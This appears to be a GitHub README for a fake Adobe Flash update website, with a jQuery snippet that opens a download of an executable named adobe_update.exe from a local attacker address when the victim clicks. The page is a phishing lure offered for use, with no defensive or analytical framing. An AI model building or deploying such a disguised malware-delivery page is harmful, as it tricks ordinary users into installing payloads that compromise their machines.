# Fake-Update-Page
Fake Update Website  ( On Click Automatic Download Windows Payload )

## Set Payload URL:-

```
    $(document).ready(function (){

        $('#CF_OPEN').on('click', function(){

            var payload_url = "http://192.168.0.108/payload/adobe_update.exe";
            window.open(payload_url, '_blank');

        });

    });
```

##Preview :-

![Fake-Adobe-Flash-Update](https://user-images.githubusercontent.com/26626045/78744552-848f1b00-797f-11ea-969a-0f4827a80050.PNG)
